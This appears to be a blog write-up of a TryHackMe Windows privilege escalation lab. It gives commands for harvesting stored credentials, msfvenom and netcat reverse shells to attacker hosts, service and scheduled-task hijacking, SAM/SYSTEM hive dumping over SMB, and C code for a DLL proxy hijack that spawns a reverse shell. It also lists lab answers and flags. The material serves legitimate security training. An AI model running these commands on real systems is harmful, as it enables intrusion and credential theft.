---
title: Windows Privilege Escalation
date: 2022-06-17 18:32:00 -0500
categories: [Lesson, Tutorial]
tags: [privesc, windows]
---

Learn the fundamentals of Windows privilege escalation techniques.

<https://tryhackme.com/room/windowsprivesc20>

* * *

## Task 1 - Introduction

This room covers fundamental techniques that attackers can use to elevate privileges in a Windows environment, allowing you to use any initial unprivileged foothold on a host to escalate to an administrator account, where possible.

* * *

## Task 2 - Windows Privilege Escalation 

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:

  - Misconfigurations on Windows services or scheduled tasks
  - Excessive privileges assigned to our account
  - Vulnerable software
  - Missing Windows security patches


##   Answer the questions below

**Users that can change system configurations are part of which group?**

- administrators

**The SYSTEM account has more privileges than the Administrator user (aye/nay)**

- aye

* * * 

## Task 3 - Harvesting Passwords from Usual Spots 

- ``type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`` - PowerShell History 
- ``cmdkey /list`` - Saved Windows Credentials 
- ``runas /savecred /user:admin cmd.exe`` - if you notice any credentials worth trying, you can use them
- ``type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`` can store password for databases on IIS configs in the following locations: ``C:\inetpub\wwwroot\web.config`` or ``C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config``
- ``reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s`` - retrive stored proxy credentials.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

##   Answer the questions below

**A password for the julia.jones user has been left on the Powershell history. What is the password?**

- ZuperCkretPa5z

**A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?**

- 098n0x35skjD3

**There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.**

1. cmdkey /list 
2. runas /savecred /user:mike.katz cmd.exe
3. THM{WHAT_IS_MY_PASSWORD}

**Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?**

1. reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s
2. CoolPass2021

* * * 

## Task 4 - Other Quick Wins 

- ``schtasks`` lists scheduled tasks.
- ``schtasks /query /tn TASK_NAME /fo list /v`` - list detailed information on a task. We want to look at **Task to Run:** and **Run As User**. If the current user can modify or overwrite the Task to Run executable we can do privesc. 
- ``icalcs`` check file permissions

- AlwaysInstallElevated we can generate installers with malicious .msi files using msvenom eg ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.42.60 LPORT=LOCAL_PORT -f msi -o malicious.msi``

##   Answer the questions below

**What is the taskusr1 flag?**

- ``echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat``
- setup netcat listener
- flag is on desktop

* * * 

## Task 5 - Abusing Service Misconfigurations 

**Windows Services**

- ``sc qc`` understand service structure - ``BINARY_PATH_NAME`` executable, ``SERVICE_START_NAME`` account used to run the service
- All service configs are stored on the registry @ ``HKLM\SYSTEM\CurrentControlSet\Services\``

**Insecure Permissions on Service Executable**

- ``sc qc`` check service
- ``icacls`` check permissions on service executable - if lower permission we can overwrite with payload, and service will execute.
- ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`` create payload
- ``python3 -m http.server``
- pull from powershell with ``wget http://10.x.x.x:8000/rev-svc.exe -O rev-svc.exe``
- replace service executable with payload ``move Wservice.exe Wservice.exe.bkp`` and ``move rev-svc.exe Wservice.exe``
- and grant permissions with ``icalcs WService.exe /grant Everyone:F``
- start up netcat listener
- restart service ``sc stop windowsscheduler`` ``sc start windowsscheduler`` (with powershell you need sc.exe as sc = set-content)

##   Answer the questions below

**Get the flag on svcusr1's desktop.**

- Follow Insecure Permissions on Service Executable Steps
- THM{AT_YOUR_SERVICE}


**Get the flag on svcusr2's desktop.**

- Follow Unquoted Service Paths
- THM{QUOTES_EVERYWHERE}

**Get the flag on the Administrator's desktop.**

- Follow Insecure Service Permissions
- THM{INSECURE_SVC_CONFIG}

* * * 

## Task 6 - Abusing dangerous privileges 

Windows Privileges:

- ``whoami /priv`` check privileges. [complete list of windows priv](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). list of exploitable priveleges [Priv2Admin](https://github.com/gtworek/Priv2Admin)

Backup SAM and SYSTEM hashes:

- ``reg save hklm\system C:\Users\THMBackup\system.hive``
- ``reg save hklm\sam C:\Users\THMBackup\sam.hive``

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox.

##   Answer the questions below

**Get the flag on the Administrator's desktop.**

- THM{SEFLAGPRIVILEGE}

* * *

## Task 7 - Abusing vulnerable software 

``wmic`` list software installed and versions
``wmic product get name,version,vendor``

Doing this on the target we can see its running RealVNC 6.8.0 and that has a privelede escalation vulnerability https://www.triskelelabs.com/realvnc-server-privilege-escalation.

**Create a Proxy DLL**

1. proxy.c

```c
#include <windows.h>

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
            system("whoami > C:\\output.txt");
    }

    return TRUE;
}
```

2. proxy.def 

```c
EXPORTS
    Method1=C:/Windows/System32/original.dll.Method1 @1
    Method2=C:/Windows/System32/original.dll.Method2 @2
```

3. We need a list of all the exports available in the origional DLL we are replacing. Copy ``c:\Windows\System32\adsldpc.dll`` to our machine using ``smbserver.py``
- ``mkdir share``
- ``smbserver.py -smb2support -username thm-unpriv -password Password321 public share``
4. on the target machine cmd.exe ``copy C:\Windows\System32\adsldpc.dll \\ATTACKER_IP\public\`` to move it to our attacking machine.
5. copy modified room code to ``get_exports.py`` and run it with ``--target adsldpc.dll --origionalPath 'C:\Windows\System32\adsldpc.dll' > proxy.def``
6. compile the DLL with
- ``x86_64-w64-mingw32-gcc -m64 -c -Os proxy.c -Wall -shared -masm=intel``
- ``x86_64-w64-mingw32-gcc -shared -m64 -def proxy.def proxy.o -o proxy.dll``

##   Putting it All together**

1. Copy the file over with smbserer running ``copy \\10.x.x.x\public\proxy.dll`` and rename ``move proxy.dll adsldpc.dll``
2. Running VNC repair in add/remove programs will give us the output.txt and we can see the user is ``nt authorioty/system``

##   Repeat with Reverse Shell To get Flag

1. ncshell.c

```c
#include <windows.h>

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
            system("C:\\tools\\nc64.exe -e cmd.exe 10.x.x.x 6666");
    }

    return TRUE;
}
```

2. compile dll again/copy over, repeat VNC repair after setting up netcat listener on kali machine.

* * * 
